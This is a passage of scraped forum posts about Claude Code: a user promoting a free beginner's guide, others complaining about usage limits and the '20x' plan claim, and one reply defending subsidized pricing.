needed.\n\n\\---\n\nCandidly this is the condensed version. I wrote up [ https://masteringai.io/guides/ultimate-claude-code-guide-for-beginners ](https://masteringai.io/guides/ultimate-claude-code-guide-for-beginners) if you want to go deeper. It's free. I just want people to stop making the same mistakes I did.\n\n**Claude Code (and AI) has been an incredible tool for me, and for the first time in my life I've been able to bring every idea to life.**\n\nNo need to raise $8m funding like I did for my startup.\n\nMy obsession has gotten so bad I'm banned from talking about Claude Code with my friends, so here I am 😅.\n\nHope this helped.\n\nWhat's working (or not working) for everyone else? Curious what patterns others have found.",

I'm honestly not sure how you could be using it that much and not run into the limits. Perhaps it depends on what you're working on, but anything with complexity requires a ton of context to get anything done. Even when I'm working on something new, it will tend to grow until I have to think carefully about modularization, and then there is a lot of refactoring (uses lots of tokens). I blow the five-hour limit quite often, and I can do it while working on a single project without subagents if it's something heavy. And I'm using Codex and Gemini too.

At least that’s what I’ve found anyway.

I was two clicks away from wasting 150 additional euros. \nThe bot, after me pressing and calling it a scam did agree that this info should be made transparent in the checkout process and that the claim of 20x there is not transparent…\n\n\nI also asked it to estimate the additional api call costs I would have to pay for true 20x weekly limit and it told me the additional costs would range from 6960-15360$ \n…. I would take this number with a huge boulder of salt tho…\nAnyway I feel scammed.",

But you still want to complain about it ;) I'm with you that the tighter limits are not cool, but it's not like you are 'not getting what you paid for'. Many ppl will disagree and call it a corporate scam. I think nobody was complaining this hard when you no longer got $25 for signing up to PayPal ... or any other startup. In the case of Claude we are all so deep into it, that we mahybe forget it's still just another startup offering subsidized services, so we should be happy with anything we get that is below API cost.
